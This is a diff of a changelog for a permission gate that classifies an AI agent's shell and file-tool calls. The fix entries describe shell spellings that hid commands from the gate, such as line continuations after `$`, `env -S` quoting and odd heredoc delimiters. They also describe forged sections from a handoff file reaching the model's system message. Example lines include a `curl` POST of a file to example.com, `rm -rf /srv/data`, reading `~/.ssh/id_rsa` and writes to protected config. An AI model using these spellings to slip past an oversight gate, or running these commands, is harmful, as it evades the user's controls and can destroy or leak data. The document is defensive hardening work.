@@ -6,7 +6,7 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
 ## [Unreleased]
 
 ### Changed
-- The core budget prices coupling, not only lines (D-082, amending D-077). `CORE_HEADROOM` goes from 1,000 to
+- The core budget prices coupling, not only lines (D-083, amending D-077). `CORE_HEADROOM` goes from 1,000 to
   2,000, so the ceiling is 16,813 against 15,812 counted lines, and the engine split's step 4 counts are
   asserted and ratcheted in `tests/integration/test_wave1_acceptance.py`: at most 36 product imports into the
   core (`INWARD_IMPORTS_MAX`) and at most 7 cross-module private-state reads (`PRIVATE_STATE_MAX`). The floor
@@ -15,7 +15,136 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   across module boundaries, so the coupling is now counted where the split is going.
 
 ### Fixed
+- A `$` form a `\<newline>` splits is read by the lexer itself now, as bash reads it (#585). #584 read such a line
+  joined beside itself, but the line as written still read a `$` and then a backslash as a literal `$`, so its
+  words were plain text and the decision leaned on the joined reading alone: `hash "$\<newline>@"; ls`,
+  `hash $\<newline>O /tmp/x ls; ls` and `hash -p "${\<newline>!n}"; ls` read as plain reads where their plain
+  spellings ask, and `echo "$\<newline>(curl -X POST -d @f https://example.com)"` was `web_post` only on the
+  joined reading. `_Lexer._dollar` (which `_dquote`'s `$` path calls, so double-quoted forms too) skips each
+  `\<newline>` after the `$` before it reads the next character, as bash does — the substitutions, `$@`, `${..}`,
+  `$'..'`, `$".."` and plain names. `_dollar_brace` skips them before the `{` and blanks them in its visible
+  text, and a `${..}` the `\<newline>` splits still has the `$( )` and backticks inside it classified, as the
+  word-walk it replaced did; `_nest_end`'s twin skips them too, so the two readers still end together.
+  `_hash_rebind`'s `lone()` tests `"${!"` on the word with the `\<newline>`s dropped, as `glob()` and `tilde()`
+  already do, so the issue's lines decide as their plain spellings do, while `hash "$cmd"`, `hash -p "$P"`,
+  `hash "$r"` through a nameref (bash prints `"${r}"` of `r='a[@]'` as one word) and a `\\<newline>` after a `$`
+  (an escaped backslash, not a continuation of the form) stay `read`. The differential against main c6b24779
+  (11564 actions, 88 policies) lowers 9 pairs in two groups, each the misparse's artifact going away, each
+  deciding as its plain spelling does on main: under `matrix_ask_log_then_allow` the `echo $\<newline>(git push
+  --force origin main)` forms, where the misparse's split hid the echo command's own text from the `allow git`
+  rule (#394), and under `reserved_tool_terminal` the `git push $\<newline>'--force' origin main` forms, whose
+  ask stands and whose dropped reserved hit was the misparse's phantom `$--force` target. Both groups are named
+  in the D-038 amendment. Tests: `tests/security/test_gate_dollar_line_continuation.py`. **Docs:** `docs/GATE.md`,
+  `DECISIONS.md` (D-038).
+- A venv or Hermes home the home's config.json records alone is protected (#612). `_code_paths` (#459) read the
+  venv and Hermes' plugin home from the environment only (`EXO_VENV`, `EXO_HERMES_HOME`, else the home's own
+  spellings), but a supported custom install records them in the file alone: `scripts/install.sh` takes the venv
+  from `EXO_VENV` at install time and writes that path back into config.json (`venv`, and `hermes_home` beside
+  it), and nothing exports the variables when the daemon runs, so with `{"venv": "<tmp>/customvenv"}` in
+  config.json and no `EXO_VENV`, a `write_file` into `<tmp>/customvenv/lib/evil.py` classified `local_write` and
+  was allowed under the default policy, while `Config.load` resolved that same folder as the venv. The gate now
+  reads the recorded `venv` and `hermes_home` too, as `_store_roots` reads the config's `principals` through
+  `store.explicit_roots`: a missing or unreadable file, or a value that is not an absolute path once ~ is
+  expanded, adds nothing, and the environment still takes precedence, as `Config.get` resolves it — a folder the
+  file records joins the protected list beside what the environment names, it never replaces one. So the
+  default-spelling rows and a config with no such keys decide as main does, and only new folders ask: a
+  config-only venv or Hermes plugin home asks as `store_write` on the floor, a `cd` into it counts, a delete or
+  move of it counts, reads stay reads. The differential against main d4cc7ea3 found nothing lowered. Tests:
+  `tests/security/test_gate_code_writes.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
+- A leading assignment quoted whole in an `env -S` text no longer hides the command after it (#591). GNU env splits
+  the `-S` text into words and reads them as its own argv, so a word quoted whole with the form `NAME=value` is an
+  assignment there — `env -S "'X=a b' printenv X"` prints `a b` — but the gate read the text as one shell line
+  (`classify_shell` of the split), whose first word was an unknown program, so the command behind it was never
+  read: `env -S "'X=a b' rm -rf /srv/data"`, `sudo env -S "'X=a b' rm -rf /srv/data"` and
+  `env -S '"X=a b" rm -rf /srv/data'` were `opaque_exec` and asked under `deny: [delete]`, where the spelling
+  without `-S` is `delete` and denies, and under `categories: {opaque_exec: allow}` the first was allowed, so a
+  policy that denies the hidden command or allows the shell around it failed open. The gate now reads the leading
+  words of the split text as env's own argv, as env's own arguments already are: the first word that is neither an
+  env option (`-i`, `--null`, `-u NAME`, `--chdir DIR`...) nor an assignment starts the command, for `-S`,
+  `--split-string` and behind `sudo` and `doas`, and the text from that word on is classified beside the shell
+  line's reading, so the hidden command's category reaches the decision the way the spelling without `-S` does
+  (`git push origin feature && env -S "'X=a b' git push --force origin main"` now asks under the allow line, not
+  logs). After `--` a quoted `NAME=value` word is the command, a word a shell operator would separate stays with
+  the line's own reading (a word of argv to env), and a split inside the split is not followed — each reads as
+  before, so nothing lowers; an unknown program first is still the command and its arguments run nothing. The
+  differential against main 3bf26afc (11438 actions, 88 policies) found nothing lowered. Tests:
+  `tests/security/test_gate_category_deny_parts.py`. **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
+- A policy pattern that does not compile is refused when the policy loads (#466). `normalize_policies` checked
+  types and outcome names but compiled nothing, so a rule's `match.command`, a `command:` entry or a mapping's
+  `command` in `deny:` and `reserved:`, and a `posting.forbid` pattern with a typo raised `re.PatternError` only
+  when `decide` reached it. The exo-gate hook caught that: with no required executor a read tool ran with no ask,
+  observe mode ran the call, and enforce mode showed a fallback card with no approver list offering "always", so
+  one typo in a deny entry a principal added to tighten the gate could let a seat answer every later call the
+  gate failed on. The loader now compiles each of those patterns and raises `PolicyError` naming the entry, and
+  `load_policies` names the file before it (`policies/gates.yaml: gates.deny[0].command: bad pattern '^(rm|shred':
+  missing ), unterminated subpattern at position 1`), so the hook's fallback runs on the defaults, which ask on
+  anything irreversible or public, with the message in every decision's reason and in `/gate`; a store write, a
+  secret and a force push still ask the principal alone, once, in every mode, on a real rule key. A policy whose
+  patterns compile decides identically; only the broken one changes. Tests: `tests/security/
+  test_gate_policy_patterns.py`, `plugins/exo-gate/tests/test_hook.py`, `plugins/exo-gate/tests/test_tool_cwd.py`.
+  **Docs:** `docs/GATE.md`, `DECISIONS.md` (D-038).
+- A decision number `docs/FIX-SWEEP.md` lists as free can no longer already be one `DECISIONS.md` uses
+  (#600). The sweep's list read D-078 and D-082 as free while PR #235 itself added the D-082 entry, and the
+  docs tests passed on that head; an earlier collision with D-081 from #214 was caught only by hand.
+  `tests/docs/test_docs_fix_sweep.py` reads the list the way the file words it ("D-078 and D-082 are free")
+  and the `## D-` headings DECISIONS.md keeps, and fails naming the collision, so a stale list or a taken
+  number cannot slip past review.
+- Permissions bypass lowered asks in turns the principal did not start (#598). The gate read the mode by session
+  alone, and no hook could tell who started a turn: the loop metadata carries the author (D-040) but stopped at
+  the user message. Now the loop passes the turn author into every `ToolContext` and tool hook kwarg (`author`,
+  beside `turn_id`), and the gate lowers an ask only when that author is the principal, so a turn a local caller,
+  a peer, a bus wake or a job notice started in the same core asks as if bypass were off. A non-principal steer
+  stops the lowering for the rest of the turn. The bypass ledger row names the turn author, and hooks that do not
+  take the new kwarg are unchanged.
+- bash's legacy arithmetic `$[..]` is read as the `$((..))` it stands for (#588). bash still accepts the legacy
+  form, and it evaluates as `$((..))` does, assignments included, but the lexer read `$[..]` as plain text, so an
+  assignment in it went unseen where the same line written with `$((..))` asked (#341/#409): `echo $[PATH=5]; ls`
+  and `echo "$[PATH=5]"; ls` were allowed `read`s, and so were `echo $[BASH_ENV=5]; ls`, `echo $[a[PATH=5]]; ls`
+  (a subscript is arithmetic, and it assigns) and the #584 join `$\<newline>[PATH=5]`. The lexer now reads `$[..]`
+  as the `$((..))` it stands for, with the word keeping `$[..]` as written, and an element the body sets is read
+  too (`echo $[BASH_CMDS[ls]=1]; ls` rebinds a program name, as `hash -p` does) — also through `$((..))`, where
+  main allowed it — and `${x:-$[PATH=5]}` reads the body through the expansion word it is in. A `$[..]` in a
+  write's target keeps main's `local_write` of the path as written beside the dynamic reading, so a deny on the
+  write still reaches the line, and `echo $[1+2]` stays a read.
+- An older handoff file's raw lines no longer stand a forged section in the resumed system message (#540). After
+  #395 the header reached the model on one line and `load_handoff` read no forged ruling, but `resume_text` still
+  carried the rest of the file as written: the path line and the `{path}` launch line of main's writer before #395
+  (a handoff folder name that spans lines in the operator's config), a title from before #353, a list field from
+  before #353 and a summary from before #349 could put a forged `## Decisions made (principal's words, verbatim)`
+  section in the system message beside the principal's real one, and a pre-#353 title could put a forged
+  `## Open decisions` section first, which `load_handoff` read. `resume_text` now demotes every `## ` heading line
+  `load_handoff` does not read as the section, so the reader's copies stand and the forged ones reach the model as
+  `### ` data, quoted words included. `load_handoff` reads no section out of a title that does not say what the
+  header's recovered topic says: the title must be the topic value's footprint, line for line. A pre-#353 file whose
+  title carried a forged Decisions copy therefore reads the principal's ruling again where it read as undecided, and
+  a forged Open decisions first loads none; a title edited by hand demotes nothing. The demotion takes the heading
+  spellings a markdown reader takes: up to three leading spaces, and after the `##` a space, a tab or the line's
+  end, while a fourth leading space stays an indented code block and the line stands as written. A header value's
+  `-->` is now
+  written `--\>`, so a markdown viewer's comment keeps the header whole, and the reader undoes the escape, where an
+  older file's raw `-->` in a value reads as itself. Not covered: a forged `## Open decisions` first through an older
+  file's path or launch line still reads as on main, for the reader has no value to check a path line against.
+- Every store path a write names is a target, not only the first (#514). A store write with no secret on the call
+  took its target from the first store path the scan met and made no part of the others, so a `target:` deny or
+  `reserved:` entry on a later path missed and an approver could have waved the write through:
+  `cp ~/.exo/policies/a.yaml ~/.exo/policies/gates.yaml`, `copy_file` and `move_file` from `a.yaml` to
+  `gates.yaml` and `delete_file` on both paths asked under `deny: ["target:*/gates.yaml"]`. The store scan now
+  keeps each store path a shell line or file tool writes, in the order it meets them, and each is a `store_write`
+  part with that path as its target, as beside a secret (#447), so the entry matches whichever path it names. The
+  first path still leads the line, `rm` of both paths was denied already (its `delete` part names the last path),
+  reads keep their class, and the first path alone decides as before.
 - A glob in a secret store's folder asks (#594). `cat ~/.ss?/*`, `cat ~/.aw?/*` and `cat ~/.exo/key?/*` read as ordinary reads because `_glob_word` gave up whenever the folder part held a glob; the globbed folder is now tested against each sample's folder, with the same three-literal discipline the file side keeps and bash's rule that only a literal dot matches a leading dot, so `cat ~/*/*` stays a read.
+- An ssh or mosh hop keeps its host among the line's other targets when the remote command names a target of its
+  own (#493). The hop gave the host as the line's target only when the remote command's dominant part had none, so
+  `ssh prod 'echo hi > /etc/hosts'` was a `local_write` of `/etc/hosts` alone: a `target: prod` rule allowed it,
+  `scopes: {private: [/etc/*]}` read a path on another host as the principal's own, and a standing grant for a
+  local write to `/etc/hosts` covered the same write on any host. A deny or `reserved:` entry on the host still
+  reached the hop's part (D-075). Now the host and the destination stay among the other targets (#399) whenever
+  the line's target is not one of them, so the line is decided on the host too and the strictest stands: the rule
+  reaches the line as a deny reaches the hop's part, a scope on a local path stops at the host's reading, which
+  keeps the exposure the hop gives the line, and the other targets bind the call to the exact command, so no grant
+  for a local write runs the hop. The written path stays the line's target, so a rule on it still matches as
+  before, and a rule on the bare host reaches a `user@host` destination too.
 - A gh download or clone into the Exo store is a store write, as `curl -o` and `git clone` already are (#461).
   gh release download, gh run download and gh attestation download write what they fetch into `-O`/`--output`
   or `-D`/`--dir`, and gh repo clone and gh gist clone into their directory word, but they read as reads on
@@ -27,6 +156,13 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   in `bash -c` or a `$( )`, and past a `-R` before the subcommand (#399). The line keeps the gh read as a part
   (D-075), so a deny, reserved entry, rule or matrix cell on it still applies, and the decision is the
   principal-only floor. `-O -` prints to stdout and stays a read, and so does a path outside the store.
+- Gate (#587 follow-up, D-074): a `config.json` name an expansion hides keeps main's reading again. The merge of
+  #320 into #587 let #320's store glob count the home's `config.json` without marking the call, so the line kept no
+  reading as before D-074, or that reading counted the file too. Under `matrix_deny_cells`,
+  `ssh -o RemoteCommand='rm -rf /srv/data; cp /tmp/x ~/.exo/con$(:)fig.json' h` asked where main before #587
+  denied it, and so did a delete beside such a name under `delete: deny` with a rule allowing `^rm`, and an
+  `echo x >` to it over ssh under an entry on `opaque_exec` at `internal` exposure. The glob now counts the file
+  only while it counts, so the call is also read as before D-074. Such a name still asks as a store write.
 - A file tool's store path is read under every key it names a path by, and a move or rename of a folder that holds
   the store is a store write with no secret beside it, as `mv` is (#494). `move_file ~/.exo -> /tmp/x` was a
   `local_write` that ran with no ask where the shell spelling asked, `mcp__filesystem__move_file` with the same
@@ -150,6 +286,17 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   (`escalate: [read]`, `escalate: read`) only add escalation, and `/gate` shows a standing policy error. Other
   policy errors still use the defaults alone. `normalize_policies` and `load_policies` take an optional error
   list; without it they raise as before.
+- Two valid policy files (a file changed mid-session, before `/gate accept`) decide as one stricter reading in the
+  exo-gate plugin (#586, after #557 for a policy error). The changed file used to win only with a strictly higher
+  outcome: at an equal outcome the pinned decision stood with its own violations and exposure, and a standing grant
+  was looked up against that one decision, so an unbound grant on the changed file's `reserved` entry ran a call
+  the pinned file logs, and a grant bound to the exact line ran a call the pinned policy asks for without that
+  binding (a sudo write line the changed files bind). The old and new decisions now merge as the gate merges a
+  line's readings: the widest exposure, a third party if either has one, every violation and reserved part, and at
+  an equal outcome the other side stands only when it lists a violation the standing one lacks. A standing grant
+  applies only where each side's own decision (with the decision model's verdict) also asks and finds one, each
+  side by its own lookup. No outcome is lower than either side's; a single valid file decides as before, grants
+  included.
 - The gate reads Codex `apply_patch` move destinations (`*** Move to:`) as file-write paths (#528).
   A move into a protected store or secret folder now asks, as an Add or Update header on that path does.
   Absolute links, home and environment spellings, distinctive relative names and braces use the existing checks.
@@ -318,8 +465,20 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   even when the undone turn says it again, also after a restart, in a new agent and in a `/branch` child. An
   undo that also takes that summary row drops the ruling. A transcript that does not reach back to where the
   window started drops nothing. The ruling leaves the pins, the next turn's block and every later summary
-  block and handoff, after any number of compactions. Compaction drops no pin on its own, so a ruling in the
-  tail that `/compress here N` holds out stays pinned. A drop is logged as counts per kind and the session id.
+  block and handoff, after any number of compactions. A rebind puts it back no more (#592): Hermes builds a
+  new agent on a `/model`, `/reasoning` or `/fast` change and on `/resume`, and every such bind merged the
+  parent session's pins into the child's, so a `/branch` or compression child that had undone a ruling held
+  it again and the next turn's block or compaction wrote it back. What an undo drops is now kept in the pins
+  file as digests, beside the folded pins' ties, and a pin carry skips a parent pin whose digest is there. A
+  first bind still inherits, a pin the child still holds carries as before, and a ruling said again after the
+  undo is pinned again, so only its undone copy stays out. A `/compress` between the last turn and the undo
+  keeps the earlier undone turns' pins no more (#581): the compaction folded the window's first row and the
+  window was not updated, so the next turn's transcript held neither that row nor its summary part, and no
+  summary row stood for it — the undo read as cut short. A compress now notes that fold in the pins file, with
+  or without a pending undo, and the undo counts the noted row's summary as reaching back; a compress that
+  folded only rows the window never held still counts as cut short. Compaction drops no pin on its own, so a
+  ruling in the tail that `/compress here N` holds out stays pinned. A drop is logged as counts per kind and the
+  session id.
   This also corrects the #385 entry below and the D-040 amendment: what a pinned block held survives
   compaction by the pins until an undo removes its turn. exo-context hears a Hermes undo only through
   exo-memory. The messaging gateway's `/undo` tells no one, and neither does the CLI from a command such as
@@ -466,6 +625,19 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   still binds.
 
 ### Security
+- Gate (#328, D-038): a quoted heredoc delimiter with a space hid the commands after the heredoc. The lexer ended a
+  body at the first line that equalled the delimiter once its surrounding whitespace was stripped, so a delimiter such
+  as `<<'EOF '`, `<<"EOF "`, `<<' EOF'` or `<<EOF\ ` never matched and every later line, the real terminator included,
+  was read as body: `cat <<'EOF ' ... EOF ` then `git push --force`, `rm -rf build` or `gh pr merge` ran under the
+  default policy as an allowed `cat`. The lexer now ends the body on the line that equals the delimiter exactly, as
+  bash does (the delimiter is the opener word after quote removal, for every quoting form; leading tabs dropped on the
+  terminator only for `<<-`), so the commands after it are classified and denied. When no line ends the body it fails
+  closed and reads the body as commands. Whitespace-near lines mark the body ambiguous without ending it early;
+  carriage returns in delimiter words are retained, and `EOF)` ends a body only inside a substitution. Named
+  descriptors retain hidden-variable assignment checks. A `{var}<<` heredoc or `{var}<<<` here-string (bash 4.1+ puts it on a new
+  descriptor, not stdin) is no longer read as a command's stdin, as a numbered `3<<` already was (#306): a post whose
+  real body comes from a pipe is not mistaken for the heredoc, and its body stays unseen. (Known limit kept: a `~`
+  after `=` in a word such as `body=~/F` is not yet treated as an expansion, so the home-path scrub reads it literally.)
 - Gate (#584, D-038 amendment): a backslash-newline right after a `$` no longer hides a command substitution, a
   parameter expansion or a `$@` split. Bash drops each `\<newline>` outside single quotes before it reads a word,
   so `echo "$\<newline>(git push --force origin main)"` runs the push, but the gate read the `$` as text and
@@ -475,6 +647,17 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   line read again from it once decoded (`bash -c $'..'`, `eval "..."`, ssh, backquotes), and also as written, as
   before. `decide` keeps the stricter (`gate.readings`), the more severe reading leads the approval card, and an
   approval for such a line binds to its exact text. A line the join leaves as it is is read once, as before.
+- Gate (#515, D-038 amendment): The name parser adds camelCase words beside each separator part. The complete unsplit call is also
+  read as a policy floor: its secret and store checks, target, posting text and category rules still apply.
+  This prevents a new read hint from bypassing a store-source ask, an outbound hint from bypassing a
+  credential ask, and a draft hint from weakening an existing send reading. A policy that asks or denies
+  `unknown` still applies to a camelCase call previously read as unknown. `deleteFile` on `~/.exo`
+  now asks through its new store-write reading; `readFile` on a store file still asks through the old
+  store-source reading. Compact names such as `apiKey`, `checkOut` and `signUp` retain their old
+  reading. Empty separator parts are dropped, preserving the MCP remote-write flag for leading separators.
+  Earlier built-in differential counts covered the pre-review implementation only and do not validate
+  these additional regressions. Regression tests cover secret/store floors, outbound metadata and posting
+  rules, explicit unknown-category policies, and leading-separator MCP names.
 - Gate store protection (#125, D-074): `$EXO_HOME/config.json` is a store path. It names the plugins the core loads
   (this gate among them), their config, the `venv` that runs Exo, each provider's `base_url` and headers, and, since
   #525, the principal a peer key with no seat file speaks for. A tool could rewrite it with no ask, even under
@@ -491,7 +674,9 @@ follow [docs/VERSIONING.md](docs/VERSIONING.md): SemVer, with a codename per MAJ
   `config.json` counted is also read as before (`Classification.ordinary`, one of `gate.readings`), and the stricter
   decision stands, so `matrix_deny_cells` still denies
   `ssh -o RemoteCommand='rm -rf /srv/data; cp /tmp/x ~/.exo/config.json' h` and `deny: [credentials]` still denies
-  `cat ~/.ssh/id_rsa; cp /tmp/x ~/.exo/config.json`. A copy or extraction into a folder that holds the file is #483.
+  `cat ~/.ssh/id_rsa; cp /tmp/x ~/.exo/config.json`. A quoted or split name (`~/.exo/con'fig'.json`) and a symlink
+  to the file (made earlier, or by an `ln` on the same line) count too; the name is matched case-sensitively, as the
+  other store names are. A copy or extraction into a folder that holds the file is #483.
 - Gate (#225, #269, #309, #341, D-038): store names an expansion hides, and relative names that reach the run
   folder, now ask. #307 read an expansion inside a secret-store name as empty and, between literal text, as `*`.
   That reading now also takes a substitution at the end of a word as `*` (`cat ~/.config/gh/$(printf hosts.yml)`,
